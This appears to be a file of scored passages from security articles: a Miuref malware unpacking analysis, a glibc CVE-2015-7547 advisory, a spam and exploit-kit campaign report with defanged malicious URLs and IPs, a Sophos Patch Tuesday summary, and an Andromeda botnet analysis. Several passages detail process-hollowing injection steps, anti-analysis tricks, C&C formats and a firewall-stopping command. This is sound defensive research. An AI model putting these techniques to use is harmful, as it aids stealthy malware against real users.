Figure 5. Snippet of the VB6 decompiler output.
The VB code that is produced shows heavy data copy operations, a call to VirtualAlloc and another one to EnumWindows, but that’s about all the analyst can derive from it.
Taking a step further, sandboxes like Cuckoo and Anubis lose track of execution at one of the many steps in the process of unpacking the payload. The Cuckoo trace ends right after the NSIS layer [2]; Anubis quits after starting the VB6 packed infector [3].
Summing the situation up, there is no easy road to El Dorado.",0.015871257428925256
"Looking at the evil twin
Meanwhile, dissecting the C++ sample presented only a minor challenge. Examining the two samples side by side, they did indeed prove to come from the same malware family. Visualizing their Procmon execution graphs, there is almost no notable difference. But it is not just the payloads that are similar – even the packers seem to operate in the same way, despite being coded in different programming languages. Both create a sub-process, terminate the parent, and have the sub process decrypt setup.dat and perform malicious actions.
The C++ twin starts by executing its code in the context of a Microsoft Foundation Class (MFC) application. Next, it walks through two layers of decompression, finally unpacking what could be called the next stage of the payload.
Figure 6. The recursive loader, which is barely used.
This final stage is a fairly big function, incorporating a lot of character-wise string construction and a lot of code – which, if we look at it more closely, is never executed. The function itself is recursive, managed by a state variable, which is handed over as a function parameter. The majority of code is beautiful, fully functioning x86 code, not obfuscated garbage code. The state variable ranges from 0 to 9 and can either be invoked from a superior caller or from within the function itself.
Some of the functionality we spotted includes:
Enumerating processes, searching for names like ‘VBoxService.exe’ or ‘vmtoolsd.exe’.
Creating/checking for a mutex named ‘UACMutexxxxx’, which has also been used in the context of various other, unrelated malware.
Registering itself under HKLM\Software\Microsoft\Windows\CurrentVersion\Run.
Executing a shell with the command ‘net stop MpsSvc’, which basically stops the Windows firewall service manually.
Creating a suspended process, overwriting its process memory and its thread context, and calling resume thread.
The function snippet that fiddles with the suspended process rang a bell somewhere in the back of my head. This is indeed the primary action of said function. In fact, the procedure starts off with state 1, checking if a file named ‘myapp.exe’ is present in the system directory root. If it is, the application terminates; otherwise it goes to state 7, where it ends up creating a process with the suspended flag set. This procedure has been analysed before [4] and apparently stems from a packer known as Local-App-Wizard.
Figure 7. Initialization of the RunPE technique.
The applied technique has long been known as RunPE and works as follows:
Create a process with the CREATE_SUSPENDED flag set.
Request and store its thread context.
Hollow the process memory with NtUnmapViewOfSection.
Overwrite the process memory with the binary of choice.
Write the thread context back using SetThreadContext, with the entry point set to fit the new binary.
Call ResumeThread to kick off execution of the sub process.
The point of this trick is that the runtime packer and payload are clearly separated, while the packed executable never touches the hard disk. A fun modification of this version of Local-App-Wizard/RunPE relates to the aforementioned binary of choice in overwriting the sub process memory: the RunPE routine iterates a hundred times, starting a copy of itself that terminates immediately. Only copy number 101 results in the unpacked payload, which later decrypts Miuref’s DLL. Conditional breakpoints prove to be a valuable asset here.
Figure 8. 101 RunPE attempts.
So, sitting on the 101st call to ResumeThread, one can just inspect the unpacked binary in memory and patch the new entry point with the infamous EB FE, attaching a second debugger instance after ResumeThread.
Interestingly, after state 7, the application goes to state 0, which means termination of the process. This state is not invoked recursively, but from a superior caller function, thus the programmer explicitly refused to make use of any of the excessive capabilities of the packer.",0.01780598294782465
"VB6 for fun and ... well
Visual Basic 6 runtime packers using the RunPE technique have been around for a while, according to [5] and [6]. Their speciality is embedding anti-analysis tricks into the pseudo code part of the packer, making it close to impossible to identify them. VB6 is great for obfuscation, of code as well as strings. It cannot easily be debugged, and dynamic analysis often fails. One possible approach is to hook into the Win32 APIs to understand the sample’s operation, but the challenge remains: one has to get around the protection mechanisms and gain control over the spawned sub process before it takes off to perform its malicious actions.
So, given that the VB6 packer can implement anti-debug, anti-virtualization and anti-sandbox mechanisms, and that there are numerous different implementations of RunPE using different Win32 APIs, such a sample can be a very hard nut to crack.
Thankfully, in this case the bad guys didn’t seem to bother too much. The VB6 packer of the Miuref sample at hand performs the following tricks:
It iterates a total number of 8,032 times over garbage code that performs string and date operations. The purpose of this is to eat up a lot of CPU for quite a while, probably to kill time or escape emulators.
The sample evades sandbox analysis thanks to its multiple packers.
The sample checks for the PEB, BeingDebugged flag and the NtGlobalFlag. (The obligatory anti-debug tricks can be found the lazy way, by brute-forcing with the IDA Stealth plug-in.)
The sample implements RunPE in VB6, using direct calls to ntdll.dll instead of kernel32.dll, such as NtMapViewOfSection and NtResumeThread.
Thus bypassing the VB6 layer is a question of intercepting execution at the right time. Given that the sample executes perfectly well in a virtual environment, and anti-debugging is sparse, unpacking can be achieved by placing a breakpoint on NtResumeThread. From there, one can inspect the memory of the yet-to-be-started sub process and patch its entry point with a breakpoint or an EB FE. Stepping over NtResumeThread, a second debugger instance can then get hold of the unpacked payload, dump the binary or continue debugging.
Figure 9. Tracing ntdll APIs to catch the unpacked payload.
Another possibility is to force the sample to load a patched ntdll.dll by tricking its module search order [7]. This way, even a debugger- and virtual-machine-aware sample can be unpacked, using a real machine and placing the breakpoints very carefully on the right APIs.
Unsurprisingly, the starting routine of the unpacked binary looks very much like the sub process the C++ sample created. From there on, the new process executes Miuref.
Figure 10. Equal starting routines.",0.018108870020596357
"The final payload
After successfully unpacking Miuref, the final executable reads like a novel. Miuref is a click fraud trojan that has been around since the end of 2013. Its primary purpose is to produce fake clicks on web advertisements in order to generate revenue for specific ads.
The malware can register extensions for the Google Chrome browser or inject add-ons into Mozilla Firefox using silent add-on injection. Both techniques have been described by Nicolas Paglieri [8]. These add-ons will then perform the click fraud operation, but potentially could also harvest data handled by the browser or modify browser display content on the fly. For coordination of multiple malware instances, Miuref uses an event, which is named using a combination of computer name and executable path.
Figure 11. Sneaking an add-on into Mozilla Firefox.
Miuref also operates as an information stealer. It collects extensive machine-related data via the WMI (Windows Management Instrumentation) interface and sends it via HTTP POST to the hard-coded IP address 195.2.253.38. Exfiltrated information includes the operating system, BIOS, processor type, video controller and sound device information.
Figure 12. Miuref collects information from the Windows WMI.
Interestingly, at startup the malware opens the client end of a pipe named ‘\\.\pipe\MBAMGuiPipe-1’, which is hard coded in the binary. Mbamgui.exe is part of Malwarebytes Anti-Malware. However, no direct connection between the pipe and the Malwarebytes software could be found.
Miuref includes a 2,048-bit base-64-encoded public key for encrypting the C&C communication with an RSA cryptographic service provider. The analysed sample communicates with the hard-coded domain 1service.org, which resolves to 146.255.195.124. Supported communication protocols are HTTP and HTTPS; messages received from the C&C server are embedded within the <body> tags of an HTML page and compressed with Gzip.
During analysis, the inspected sample downloaded an additional DLL (MD5: BC206A13218F064CC2BCCCC377664B0A) and another .dat file (MD5: 217ED8FA9CBD9774596AC60E4BA0E3D2).
For persistence, Miuref creates an entry under HKU\Software\Microsoft\Windows\CurrentVersion\Run so that regsvr32.exe will load the downloaded DLL every time the system boots.
Figure 13. Regsvr32.exe loads the Miuref DLL on every startup.",0.01719253431138612
"What we learned and have yet to learn
Miuref comes NSIS packed and wrapped with either C++ or Visual Basic 6 protection. In each case, a sub process is created and its memory overwritten with the unpacked payload to execute.
Thinking logically, the two packers can hardly be related, yet they use the same tricks. In both cases the protection can be handled fairly well by an analyst, but automated analysis systems and anti-virus engines still struggle. While VirusTotal indicates good detection for the packed binaries, feeding it the plain Miuref DLL results in a hit rate of only 10 out of 52. The final payload is almost unprotected and easy to dissect.
So in conclusion, the bad boys are smart, but they do not appear to be getting that much smarter over time – a lot of code and technique re-use can be seen in this example. Meanwhile, our analysis tools are brilliant, but after 20 years of Visual Basic, they still don’t provide a comprehensive solution for dissecting such binaries. Neither side of the anti-malware arms race has demonstrated all of its sophistication where this piece of malware is concerned.",0.012973573559268425
"Acknowledgements
Special thanks go to Jurriaan Bremer and Nicolas Brulez for their valuable input at the time of writing this article.",0.015745745333878514
"Bibliography
[1] Bremer, J. VB6Tracer Repository and Documentation. June 2014. https://github.com/jbremer/vb6tracer.
[2] Cuckoo Sandbox Analysis. June 2014. https://malwr.com/analysis/NTEzNDRkYWQ4YmZk NDFlMGExZTJmMjM1ODI5OTgzOTU/#.
[3] Anubis Sandbox Analysis. June 2014. https://anubis.iseclab.org/?action=result&task_id=19ca20f0561936174450dc89b494d9f36&format=html.
[4] Unpacking the Local-App-Wizard Packer. May 2014. http://www.gironsec.com/blog/2014/05/unpacking-the-local-app-wizard-packer/.
[5] Assar, W. Visual Basic Malware. March 2012. http://waleedassar.blogspot.co.at/2012/03/visual-basic-malware-part-1.html.
[6] Unpacking VBInject/VBCrypt/RunPE. July 2010. http://interestingmalware.blogspot.co.at/2010/07/unpacking-vbinjectvbcryptrunpe.html.
[7] Module Search Order Dialog. http://www.dependencywalker.com/help/html/hidd_search_order.htm.
[8] Paglieri, N. Attacking Web Browsers. February 2012. http://www.ni69.info/documents/security/AttackingWebBrowsers.pdf.
[9] Chubchenko, S. Decompiling P-code In Your Mind’s Eye. http://www.vb-decompiler.org/pcode_decompiling.htm.
[10] Decrypting RunPE Malware. January 2011. https://thunked.org/programming/decrypting-runpe-malware-t110.html.
Analysis of Trojan:Win32/Miuref.A. January 2014. http://stopmalvertising.com/malware-reports/analysis-of-trojan-win32-miuref-a.html.
",0.01666151628595669
Vulnerability in glibc could lead to Remote Code Execution (CVE-2015-7547),0.010815028381888858
"Forcepoint Security Labs™ are aware of a bug in the GNU C Library (glibc) that could lead to a stack-based buffer overflow.  The bug, first reported in July 2015, has now been shown to lead to Remote Code Execution (RCE).  The GNU C Library (glibc) is a core component of GNU systems and those with the Linux kernel.
The bug has been assigned CVE-2015-7547.",0.008996242394560872
Overview and Timeline,0.008873829894483598
"The vulnerable code was introduced just under 8 years ago in glibc 2.9.
A bug was reported in July 2015 indicating an issue in the code behavior.
Researchers from Google and Redhat simultaneously investigated the original bug report and discovered the RCE possibility.
The buffer overflow occurs in the function send_dg (UDP) and send_vc (TCP) for the NSS module libnss_dns.so.2 when calling getaddrinfo with AF_UNSPEC family and, in some cases, also with AF_INET6 before the fix in commit 8479f23a (only use gethostbyname4_r if PF_UNSPEC).  The use of AF_UNSPEC triggers the low-level resolver code to send out two parallel queries for A and AAAA.
A mismanagement of the buffers used for those queries could result in the response writing beyond the allocated buffer created by __res_nquery.
Systems that use glibc could therefore be affected. Such systems include DNS Servers.
The last time a RCE issue in glibc was brought to the public's attention was with the GHOST vulnerability of January 2015.",0.011630054554427893
"How Is It Exploited?
While this is not an attack on DNS servers directly, it is a vulnerability in glibc which is used extensively, including DNS servers such as BIND.  An attacker could therfore host a website that triggers the vulnerability if the DNS Server is asked to resolve to that hostname.",0.011736205351396523
"Risk and Complexity
Whilst inducing a segfault is considered relatively straightforward it is thought that a fully functioning Remote Code Execution attack is much harder to execute, although it is possible.
Given that an attacker could host a malicious domain which, when resolved by the DNS Server, could trigger a segmentation fault (and thus crash) on the DNS Server, it would be wise to consider that malware authors will be looking at this bug in more detail with a view to building a fully functioning Proof Of Concept.",0.014910235514486336
"Are You Vulnerable?
Google researchers have released a non-weaponized Proof Of Concept script which will allow you to check if you are vulnerable or if any mitigations were succesful.  That script is here and is provided ""as is"" by Google: https://github.com/fjserna/CVE-2015-7547
If you are running glibc 2.9 or above (or that instance is being used by your software vendor) you should consider upgrading to a later version or applying a vendor patch (see the Mitigation Advice below).  The latest version of glibc is currently 2.22 released on 14th August 2015, but that is likely to change soon.
To check which version of glibc you have, running a simple command on the operating system will help.  For example, on any Ubuntu system, typing <sudo apt show libc6> will print the details about glibc on the system.  As in this example which shows the system to be vulnerable, assuming no mitigations applied:",0.010169500755305871
"Mitigation Advice
A patch has been made available: https://sourceware.org/ml/libc-alpha/2016-02/msg00416.html
Multiple mitigations are provided on the above thread, including ones that do not fully work - it is worth knowing about those too.
Vendors are currently building and releasing their own patches and you should consider applying those as soon as they become available.",0.01415649109846473
"Forcepoint Security Labs are continuing to investigate this bug and any implications.
",0.01716796597425263
"A currently ongoing spam campaign attempts to trick users into thinking that their ability to send Domestic Wire Transfers has been disabled. Impersonating the Federal Deposit Insurance Corporation (FDIC), the cybercriminals behind the campaign are potentially earning thousands of dollars in the process of monetizing the anticipated traffic.
Once users click on the bogus ‘secure download link’, they’re automatically exposed to the client-side exploits served by the Black Hole Exploit Kit.
More details:",0.014973175459750632
Sample screenshot of the spamvertised email:,0.010990132234593664
"Sample of compromised URLs used in the campaign: hxxp://greetingsjackass.com/securefdicinform.html; hxxp://www.galaxiafilm.it/securefdicinform.html; hxxp://www.esv-hochkogel.at/securefdicinform.html
Client-side exploits serving URL: hxxp://stifferreminders.pro/detects/fdic-information_gather.php
Malicious payload serving URL: hxxp://stifferreminders.pro/detects/fdic-information_gather.php?fooxj=31:2v:30:1i:1o&otlzvl=2w&hmhzxma=1f:30:1k:1k:1h:1l:2w:2v:2w:1m&sgiq=1n:1d:1f:1d:1f:1d:1j:1k:1l
Client-side exploits served: CVE-2010-0188
Malicious domain name reconnaissance:
stifferreminders.pro – 198.27.94.80 (AS16276) – Email: kee_mckibben0869@macfreak.com
Name Server:NS1.CHELSEAFUN.NET
Name Server:NS2.CHELSEAFUN.NET
These are well known name servers currently in use by the same cybercriminals that launched the following malicious campaigns – “‘Your Discover Card Services Blockaded’ themed emails serve client-side exploits and malware“; “‘Payroll Account Holded by Intuit’ themed emails lead to Black Hole Exploit Kit“; “‘PayPal Account Modified’ themed emails lead to Black Hole Exploit Kit“; “Cybercriminals resume spamvertising ‘Payroll Account Cancelled by Intuit’ themed emails, serve client-side exploits and malware“.
The following malicious domains also respond to the same IP:
headerandfooterprebuilt.pro
fixedmib.net
stafffire.net
We’ve already seen these domains used in previously profiled malicious campaigns:
headerandfooterprebuilt.pro – seen in “Cybercriminals resume spamvertising ‘Payroll Account Cancelled by Intuit’ themed emails, serve client-side exploits and malware”
fixedmib.net – seen in “Cybercriminals resume spamvertising ‘Payroll Account Cancelled by Intuit’ themed emails, serve client-side exploits and malware”
stafffire.net – seen in “Spamvertised ‘Your UPS delivery tracking’ emails serving client-side exploits and malware“; “BofA ‘Online Banking Passcode Reset’ themed emails serve client-side exploits and malware“; “Bogus Better Business Bureau themed notifications serve client-side exploits and malware“.
Upon successful client-side exploitation, the campaign drops MD5: 61bc6ad497c97c44b30dd4e5b3b02132 – detected by 2 out of 42 antivirus scanners as UDS:DangerousObject.Multi.Generic.
Once executed, the sample phones back to hxxp://182.237.17.180:8080/DPNilBA/ue1elBAAAA/tlSHAAAAA/
We’ll continue monitoring the malicious activities of this group/individual, and post updates as soon as new activity takes place.
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.013084860603010395
"May, 2019 Patch Tuesday addresses critical remote desktop, DHCP bugs",0.0076144074996807865
"The vulnerabilities were so potentially harmful, Microsoft released updates for no-longer-supported Windows XP and Server 2003",0.00695469082518918
"Written by
SophosLabs Offensive Security",0.008622298185940958
"May 14, 2019",0.008372833068564955
SophosLabs Uncut Chakra Microsoft Patch Tuesday RDP Remote Desktop services SMB Update Windows,0.008259772390762032
"May 2019’s Patch Tuesday is notable for many reasons: not only it is Microsoft’s biggest release (in terms of the number of fixes) so far for the year, but it also also includes two critical updates: a patch for RDP that Microsoft deemed so critical they decided to push an out-of-support patch for Windows 2003 and XP, and another for DHCP server. Both could be exploited without any user interaction, and provide privileged access to the compromised server.
One of the highlights of this month PT is that Microsoft decided to release a total of 79 security updates for May 2019 for various products, which makes it the biggest release to date with 22 vulnerabilities flagged as Critical, and 56 as Important.",0.008870540834096219
"If that wasn’t enough, this month’s set of Windows updates coincides with a slew of fixes for Adobe products, including patches that address 84 distinct, important vulnerabilities in Adobe Reader, and one for Adobe Flash Player. Because most of those vulnerabilities involved memory corruption, Adobe characterized their exploitation as “less likely.” However, we still recommend that you download and deploy the patches from Adobe as soon as possible, because they’re still incredibly dangerous if someone figures out how to exploit them (and there are people who will try).
The most-affected Microsoft products by the latest updates are Chakra Scripting Engine (the core of the Edge browser, which fixed 14 potential Remote Code Execution vulnerabilities). Microsoft also fixed 13 bugs in the Jet Database Engine, and 12 that affected Office/SharePoint, addressing a wide range of vulnerabilities, from cross-site scripting (XSS) to EoP. Microsoft also patched several components of the Windows kernel (including GDI+, Win32k and NDIS drivers, Windows Error Reporting, Remote Desktop services (which we take to mean, not the RDP protocol, itself, or the client application) and DHCP services, and the Hyper-V hypervisor.",0.01197395180811811
"The month’s most important updates
Remote Desktop Service:  The most important update from Microsoft will fix a Remote Code Execution vulnerability in Remote Desktop Services (CVE-2019-0708). The company disclosed little information regarding the vulnerability itself, but the very fact that Microsoft decided to provide patches for Windows XP and 2003, both of which have reached their end-of-life (in April, 2014 and July, 2015, respectively) imply that the underlying bug affecting this subsystem is likely to be exploitable, and possibly wormable, as no user interaction is required.
The vulnerability, tagged as Critical by Microsoft, can be triggered by an unauthenticated attacker by sending specifically crafted packets. A successful exploitation of this vulnerability would allow said attacker to entirely and remotely compromise the target server with maximum privileges. It should be stressed that owners of Windows 8/2012 and higher are not impacted by this vulnerability. If you own a Windows XP/2003 or Windows 7/2008, it is critical to patch as soon as possible, or upgrade to a more recent Windows version.
DHCP Server: Another critical vulnerability this month is designated CVE-2019-0725: Windows DHCP Server Remote Code Execution vulnerability. Although the Windows DHCP service has been the target for several vulnerabilities in the past few months, the vulnerability CVE-2019-0725 affects the Windows DHCP Server service, and doesn’t require authentication to be triggered. Therefore by successfully crafting specific DHCP datagrams, an attacker could exploit the vulnerability and run arbitrary privileged code on the DHCP server, which could in turn into a full AD domain compromise.
Chakra Scripting Engine Memory Corruption Vulnerabilities: ChakraCore (the Edge browser JavaScript engine) and Internet Explorer were found vulnerable to multiple use-after-free and type confusion vulnerabilities. By simply visiting a web page embedding an exploitation payload, a user can unwillingly allow an attacker to execute code with their level of privileges. The company’s patch addresses vulnerabilities with the following designations: CVE-2019-0912, CVE-2019-0913, CVE-2019-0914, CVE-2019-0915, CVE-2019-0916, CVE-2019-0917, CVE-2019-0922, CVE-2019-0923, CVE-2019-0924, CVE-2019-0925, CVE-2019-0927, CVE-2019-0933, CVE-2019-0937
Windows Kernel: This PT edition fixes several Windows kernel vulnerabilities, including a Win32k Elevation of Privilege vulnerability (CVE-2019-0892) and a Remote Code Execution vulnerability in GDI+ (CVE-2019-0903). Both components suffer from memory corruption bugs which are considered likely exploitable locally for elevating privileges. The GDI+ bug could also be triggered remotely by sharing a document via SMB, or over the web or via email. Other kernel patches (CVE-2019-0758, CVE-2019-0882, CVE-2019-0961, CVE-2019-0886) fix some information disclosure susceptible of helping defeating KASLR.
How is Sophos responding to these threats?
Here is a list of protection released by SophosLabs in response to this advisory to complement any existing protection and generic exploit mitigation capabilities in our products.
Important note: The proof-of-concept code provided with Microsoft advisories does not include active exploits, and as such is not applicable to Intercept X testing, which are marked as “N/V” (not validated). The IX ability to block the exploit depends on actual exploit weaponization approach which we won’t see until it’s spotted in the wild. The SAV and IPS detections developed for the PoCs do not guarantee interception of in-the-wild attacks",0.012751787193503783
"CVE
SAV
IPS
Intercept-X",0.010185298729769032
"CVE-2019-0863
Exp/20190863-A
N/V
N/V",0.010899178815932498
"CVE-2019-0938
Exp/20190938-A
9000919
N/V",0.011134299376209023
"CVE-2019-0940
Exp/20190940-A
9000920
N/V",0.012621861073115359
Additional IPS Signatures,0.012178648849173856
Microsoft,0.01083142353498212
"CVE
Sid",0.008741579345108219
"CVE-2019-0708
50137 (SFOS) 9000924 (CROS)",0.012281495177152602
"CVE-2019-0758
9000911",0.009908421234528175
"CVE-2019-0882
9000912",0.009855196427478785
"CVE-2019-0885
1060214041",0.010077008397646359
"CVE-2019-0903
9000914",0.010306708080770166
"CVE-2019-0884
9000913",0.00972322742424625
"CVE-2019-0911
9000915",0.010100304816336614
"CVE-2019-0918
9000916",0.010461177185735915
"CVE-2019-0926
9000917",0.010471372894905961
"CVE-2019-0930
9000918",0.010264065003042666
Adobe,0.00940443541059821
"CVE
Sid",0.008741579345108219
"CVE-2019-7142
48011",0.009269434266089505
"CVE-2019-7759
49260",0.008675441352029134
"CVE-2019-7764
49313",0.00813929010237302
"CVE-2019-7766
49317",0.008549752140981859
"CVE-2019-7771
44061",0.008435295848849944
"CVE-2019-7779
49247",0.009397360452540915
"CVE-2019-7784
42285",0.008473489375463439
"CVE-2019-7794
1170412101",0.009812520316423212
"CVE-2019-7796
3310706",0.008895360920063822
"CVE-2019-7806
2200337",0.009571178158489402
"CVE-2019-7820
40573",0.00860814855594838
"CVE-2019-7826
40573",0.008559028196535978
"CVE-2019-7837
37627",0.008673528506837114
"How long does it take to have Sophos detection in place?
We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. In many cases, existing detections will catch exploit attempts without the need for updates.
What if the vulnerability/0-day you’re looking for is not listed here?
If we haven’t released an update for a specific exploit, the most likely reason is that we did not receive the data that shows how the exploit works in the real world. As many of this month’s exploits were crafted in a lab and have not been seen in the wild, nobody has enough information (yet) about how criminals would, hypothetically, exploit any given vulnerability. If or when we receive information about real attacks, we will create new detections, as needed.
This story was modified on 22 May 2019 to add new Sid codes for IPS signatures developed to detect the so-called “BlueKeep” vulnerability affecting Remote Desktop Services (CVE-2019-0708)",0.010836909688497154
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Andromeda botnet
2012-06-01",0.008878750831789683
"Neo Tan
Fortinet
,
Canada
Editor:
Helen",0.010823647776243006
"Martin
Abstract
The Andromeda botnet recruits its bots thanks to four key elements - compromised websites, an exploit kit, a downloader and a mailing engine - linked by four sequential phases. Neo Tan takes a closer look.
Copyright © 2012 Virus Bulletin",0.015158830560826897
"Andromeda’s bots are served by exploit kits hosted on compromised websites; social engineering (spam, social networks etc.) is used to direct victims to such sites. The bot’s code is obfuscated by an outsourced custom packer, and the botnet uses fast-flux C&C servers and an encrypted communication protocol.
Unlike many botnets, Andromeda uses its bots actively to spread. There are four key elements in its propagation strategy (Figure 1), which are leveraged sequentially. During this sequence, the bot also delivers its payload – this may include downloading additional arbitrary malware, stealing various account details, and spamming. In this article, we will discuss the four key elements of Andromeda’s propagation strategy, and describe how they are linked by the four-stage sequence.
Figure 1. Propagation flow chart.",0.01572675439915827
"Phase 1: Compromised websites lead to exploit kit
The compromised websites that host the exploit kits involved in Andromeda’s propagation may seem perfectly innocuous to targeted users. For example, in December 2011, we found a compromised site containing e-cards from a commonly used online greetings card site: http://www.123g****ing.com. At that time of year, it would not be regarded as suspicious for a user to receive a Christmas e-card from such a site (whether sent by a friend intentionally, or because their computer was infected, as we will see in Phase 4 below).
The redirection technique used here is rather common: a hidden iframe is inserted dynamically into the compromised website by an obfuscated JavaScript. Figure 2 is a snippet of the HTML code of the compromised page, showing one variant of the obfuscated and encrypted JavaScript.
Figure 2. Obfuscated and encrypted JavaScript.
The obfuscation and encryption vary from time to time. In the example above, the ‘eval()’ function is re-written into a new function called ‘e()’ in order to evade detection. After decryption, the encrypted data ‘n’ becomes a JavaScript function, which adds an iframe to the document body. The src field of the iframe points to an exploit kit server, or a redirect link that eventually lands at the exploit kit server.",0.014335492454242371
"Phase 2: Exploit kit performs drive-by install
The exploit kit used here is the infamous Blackhole kit [1]. The version used at the time of writing this article is in JavaScript and is obfuscated and encrypted dynamically (server-side polymorphism is a common technique among today’s exploit kits). The various exploits served by the kit are constantly updated by its authors. The kit is sold on the underground market with quite a flexible licensing scheme and also has a rental service, allowing users to rent the exploit kit servers for a period of time. Altogether, these features make Blackhole one of the most popular exploit kits at present.
Figure 3 is a screenshot of the HTTP GET stream from the victim PC to the exploit kit server.
Figure 3. HTTP GETstream.
The hex value after ‘page=’ is probably an affiliate ID, suggesting that the gang behind Andromeda has established an affiliate programme, whereby partners redirecting innocent users to the exploit kits are paid based on how much ‘fresh meat’ they bring.
The server replies with an obfuscated JavaScript implementing the exploits.
In the version we analysed, the kit contained four exploits targeting the following vulnerabilities:
Java Runtime Environment vulnerability: CVE-2011-3544
Help Center URL Validation vulnerability: CVE-2010-1885
Adobe Flash Player vulnerability: CVE-2011-0611
Adobe Reader vulnerability: CVE-2010-0188.
Following the success of any of the above exploits, a downloader is dropped on the victim’s machine and run either directly, or via an intermediary shellcode. Figure 4 shows an example of such a shellcode.
Figure 4. The shellcode.
The shellcode contains a download routine, which is encrypted using simple XOR. After decryption, it resolves and calls ntdll.URLDownloadToFileA in order to download its payload, save it to a temp file, and run it.
For more information on the Blackhole exploit kit, please refer to [1].",0.019545677762587865
"Phase 3: Downloader retrieves spam engine
The purpose of the downloader installed in Phase 2 is threefold:
To inject a Windows system executable
To send logs to the C&C server
To download the spam engine (this will be detailed in Phase 4).
The downloader in this version has four layers of packing in the following order: UPX, simple XOR, another UPX and then a custom packer. (We have also seen variants of this custom packer being used by other downloaders.) Its first decryption routine is described by the following pseudo code:
for(i = length_of_code-1; i>=0; i--;)
{
code[i] += a_hard_coded_number;
a_hard_coded_number += modifier;
}",0.014013982604733188
"Then it goes into the dynamically allocated memory to start the second decryption routine. The meaningful opcodes are buried amongst many jumps and junk calls.
Once fully decrypted, the downloader uses the SendMessageCallbackW API to set a callback function, which is the injection routine. IsWow64Process is called to determine which process is to be injected: wuauclt.exe or svchost.exe. In this example [2], because our test environment is a Windows XP 32-bit machine, the target is %System32%\wuauclt.exe [3].
The goal of this injection is to map the piece of code shown in Figure 5 into the target process in memory and call it from the entry point of the process.
Figure 5. Code to be injected is prepared in memory.
The opcode is the stub which will decrypt and execute the encrypted code. During the injection, it sets the environment variable ‘src’ to be the path of the original downloader file. Later on, it will be used for dropping files and self-deletion.
The injection method used here is relatively uncommon. It does not employ any memory-writing calls such as WriteProcessMemory or ZwWriteVirtualMemory. Basically, it makes use of multiple ZwMapViewOfSection and ZwUnmapViewOfSection calls to copy the viral code into the memory space of the target process, then it modifies the entry opcode to point to it. The steps in detail are as follows:
The addresses of ZwCreateSection, ZwMapViewOfSection and ZwUnmapViewOfSection are resolved from hash codes, each address is decreased by one, then they are stored for future use. Since the byte immediately before the start of these API functions is 0x90 (nop), calling address-1 is the same as calling the API function’s address. However, tracers won’t notice these APIs being called. So, for example, in Figure 6, VA:0x7C92D500 [4] is the address of the ZwMapViewOfSection API, but the address 0x7C92D4FF is stored and called.
Figure 6. VA:0x7C92D500 is the beginning address of the ZwMapViewOfSection API.
CreateFileA wuauclt.exe is called with parameter GENERIC_READ, then ReadFile is called but only 0x1000 bytes of the file are read, because initially, the downloader only wants to know the image size. It gets the image size from the PE header. Then it calls VirtualAlloc to allocate a dynamic memory with that size, reads the wuauclt.exe file again, and copies the whole image into the newly allocated memory.
The ZwCreateSection API is called, with the MaximumSize parameter set to the total size of the opcode and the encrypted code. Then it calls the ZwMapViewOfSection API with the ProcessHandle parameter set to the current process. This call also gets the base address of this mapped view in memory. To make it simple to remember, let’s say it is stored in the baseAddressInject variable. Both the opcode and the encrypted code are copied to the memory space pointed to by baseAddressInject to form the trunk of memory shown in Figure 5. Then ZwUnmapViewOfSection is called, with the ProcessHandle parameter set to the current process and the BaseAddress set to baseAddressInject. This action will not wipe out the injecting code that was just prepared in memory. The code stays within the memory space of the current process, although no one can view it. This unmapping is a crucial step, because without it, any following ZwMapViewOfSection calls will result in the STATUS_CONFLICTING_ADDRESSES error.
As in a common injection routine, a suspended process of wuauclt.exe is created by a CreateProcess call.
ZwMapViewOfSection is called, with the SectionHandle parameter set to the section created in step 3, and the ProcessHandle parameter set to process wuauclt.exe. The BaseAddress of this view is stored in a variable. Let’s call the variable baseAddressWuauclt. Now the malicious code prepared in step 3 is mapped into the wuauclt.exe process and baseAddressWuauclt points to the beginning of the code in the memory space. Figure 7 shows that the injecting code is now mapped into the memory space of the wuauclt.exe process. Notice that e8 15 00 00 is the operation call to the decryption routine.
Figure 7. Memory fromBaseAddress 0xA0000 in process wuauclt.exe
The rest is just about redirecting the wuauclt.exe process to baseAddressWuauclt from the entry point. Another section is created using ZwCreateSection, and ZwMapViewOfSection is called again with the ProcessHandle parameter set to the current process, and the BaseAddress of this view is stored to a variable. Let’s name this variable baseAddressInject2. Then GetThreadContext is called to get the thread context of the suspended wuauclt.exe process. The EAX register value (+0xB in CONTEXT structure) is obtained from the context structure, which is the VA of the entry point. Then the ImageBase address of the wuauclt.exe process can be calculated by using this VA minus the entry point raw offset, which can be obtained easily from the PE header.
The entire wuauclt.exe image is copied to address baseAddressInject2, which is in the memory space of the current process. Then the downloader goes to baseAddressInject2+offsetToEntryPoint to patch the entry point code to be 68 |baseAddressWuauclt| C3. In assembly code, this is:
push  baseAddressWuauclt
retn
ZwUnmapViewOfSection is called with the ProcessHandle parameter set to wuauclt.exe and BaseAddress set to ImageBase, which was obtained in step 6. This action unmaps the original wuauclt.exe image from the wuauclt.exe process.
ZwUnmapViewOfSection is called with the ProcessHandle parameter set to the current process and BaseAddress set to baseAddressInject2. This action unmaps the entry-point-modified wuauclt.exe image from the current process.
Finally, ZwMapViewOfSection is called with the SectionHandle parameter set to the section created in step 6, ProcessHandle set to wuauclt.exe and BaseAddress set to baseAddressInject2. This action swaps the modified wuauclt.exe image to the suspended wuauclt.exe process. A ResumeThread call will run the injected process from the patched entry point.
All of the effort described above is just for injecting a little DLL into a system process. Let’s have a look at what this downloader’s payload is.
As usual, it begins with collecting information about the infected PC. It gets VolumeSerialNumber and uses it as MutexName. Using the ‘src’ environment variable, it drops itself to a %Temp%\ directory with a random name generated using GetTickCount’s return value as seeds. It then deletes the original and creates an auto run entry in the registry.
Next, it prepares a message which will be sent to the C&C server in the following format:
id:%lu|bid:%lu|bv:%lu|sv:%lu|la:%lu
‘id’ is the VolumeSerialNumber, which is also used as an encryption key in communications.
‘bid’ is some counter for the communication, starting from one.
‘bv’ is probably the build version of this downloader, hard coded.
‘sv’ is the current OS version, calculated from GetVersionEx call ouputs with the format: MajorVersion<<8 + MinorVersion.
‘la’ is the SocketName, byte swapped.
